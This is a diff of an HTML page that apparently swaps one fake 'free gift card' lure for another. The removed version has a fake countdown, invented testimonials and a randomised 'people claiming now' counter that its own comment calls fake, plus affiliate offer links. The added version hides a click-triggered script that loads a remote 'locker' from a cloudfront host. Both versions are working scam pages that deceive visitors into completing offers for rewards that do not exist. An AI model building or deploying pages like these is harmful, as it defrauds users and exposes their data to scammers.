@@ -1,169 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Claim Your Free Gift Cards Now!</title>
-<style>
-  body {
-    margin:0; padding:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #f0f2f5;
-    color: #333;
-  }
-  .container {
-    max-width: 480px;
-    margin: 40px auto;
-    background: #fff;
-    padding: 25px 30px;
-    border-radius: 12px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-    text-align: center;
-  }
-  h1 {
-    font-size: 28px;
-    margin-bottom: 15px;
-    color: #222;
-  }
-  p.lead {
-    font-size: 16px;
-    margin-bottom: 30px;
-    color: #555;
-  }
-  .btn {
-    display: inline-block;
-    background: #ff6a00;
-    color: white;
-    padding: 14px 40px;
-    font-size: 18px;
-    border-radius: 8px;
-    text-decoration: none;
-    font-weight: 600;
-    margin: 10px 0;
-    transition: background 0.3s ease;
-  }
-  .btn:hover {
-    background: #e65c00;
-  }
-  .timer {
-    font-size: 22px;
-    color: #d9534f;
-    font-weight: 700;
-    margin-bottom: 25px;
-  }
-  .offers {
-    margin-top: 20px;
-  }
-  .offer {
-    border: 1px solid #ddd;
-    border-radius: 10px;
-    padding: 20px;
-    margin-bottom: 18px;
-    background: #fafafa;
-  }
-  .offer h2 {
-    font-size: 22px;
-    margin-bottom: 12px;
-  }
-  .offer p {
-    margin-bottom: 15px;
-    color: #666;
-  }
-  .live-counter {
-    background: #222;
-    color: #fff;
-    padding: 12px 0;
-    margin-top: 25px;
-    font-size: 14px;
-    border-radius: 10px;
-    user-select: none;
-  }
-  .testimonial-section {
-    margin-top: 35px;
-    text-align: left;
-  }
-  .testimonial {
-    background: #f9f9f9;
-    border-radius: 8px;
-    padding: 15px 20px;
-    margin-bottom: 15px;
-    font-size: 14px;
-    box-shadow: inset 0 0 5px #ddd;
-  }
-  .testimonial strong {
-    display: block;
-    margin-bottom: 5px;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Get Your Free Gift Card</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 40px;
+      border-radius: 15px;
+      max-width: 500px;
+      margin: auto;
+    }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+    }
+    .btn {
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #ffcc00;
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+    .btn:hover {
+      background-color: #ffaa00;
+    }
+  </style>
 </head>
 <body>
-
-<div class="container">
-  <h1>🎉 Claim Your Free Gift Cards Now!</h1>
-  <p class="lead">Limited time offer! Don’t miss your chance to get exclusive Amazon and iPhone gift cards.</p>
-  <div class="timer" id="timer">Offer ends in: 10:00</div>
-
-  <div class="offers">
-    <div class="offer">
-      <h2>Amazon Gift Card - $100</h2>
-      <p>Sign up now and get a chance to win a $100 Amazon gift card.</p>
-      <a href="https://smrturl.co/a/sd352502365/62?s1=" target="_blank" class="btn">Claim Amazon Card</a>
-    </div>
-
-    <div class="offer">
-      <h2>iPhone Giveaway</h2>
-      <p>Win a brand new iPhone with a simple signup!</p>
-      <a href="https://smrturl.co/a/sd352502365/8871?s1=" target="_blank" class="btn">Claim iPhone Now</a>
-    </div>
+  <div class="container">
+    <h1>🎁 Claim Your Free $100 Gift Card</h1>
+    <p>Complete a quick offer to unlock your reward.</p>
+    <button class="btn" onclick="openLocker()">Unlock Now</button>
   </div>
 
-  <div class="live-counter" id="liveCounter">
-    🔥 15 people are claiming this offer right now!
-  </div>
-
-  <div class="testimonial-section">
-    <div class="testimonial">
-      <strong>Jessica M.</strong>
-      Just got my Amazon gift card! This was so easy and fast, highly recommend!
-    </div>
-    <div class="testimonial">
-      <strong>Mark D.</strong>
-      Claimed my iPhone last week and received it quickly. Amazing experience!
-    </div>
-    <div class="testimonial">
-      <strong>Sarah K.</strong>
-      Love this offer, got my gift card within days. Definitely doing it again.
-    </div>
-  </div>
-</div>
-
-<script>
-  // Countdown Timer
-  let timeLeft = 600; // 10 minutes in seconds
-  const timerElement = document.getElementById('timer');
-  const liveCounter = document.getElementById('liveCounter');
-
-  function updateTimer() {
-    if (timeLeft <= 0) {
-      timerElement.textContent = "Offer expired. Please check back later!";
-      return;
+  <!-- Locker Script (Hidden, Activated on Click) -->
+  <script>
+    function openLocker() {
+      var lockerScript = document.createElement('script');
+      lockerScript.type = 'text/javascript';
+      lockerScript.innerHTML = `
+        var RSWkR_MiW_vVrYwc = {"it":4498463,"key":"65dbf"};
+      `;
+      document.body.appendChild(lockerScript);
+      var externalScript = document.createElement('script');
+      externalScript.src = "https://d2yc6hxtq0phup.cloudfront.net/0b77f29.js";
+      document.body.appendChild(externalScript);
     }
-    let minutes = Math.floor(timeLeft / 60);
-    let seconds = timeLeft % 60;
-    timerElement.textContent = `Offer ends in: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-    timeLeft--;
-  }
-
-  setInterval(updateTimer, 1000);
-
-  // Fake Live Counter animation
-  let liveCount = 15;
-  setInterval(() => {
-    liveCount += Math.floor(Math.random() * 3) - 1; // Random increment or decrement (-1,0,1)
-    if (liveCount < 10) liveCount = 10;
-    if (liveCount > 30) liveCount = 30;
-    liveCounter.textContent = `🔥 ${liveCount} people are claiming this offer right now!`;
-  }, 4000);
-</script>
-
+  </script>
 </body>
 </html>
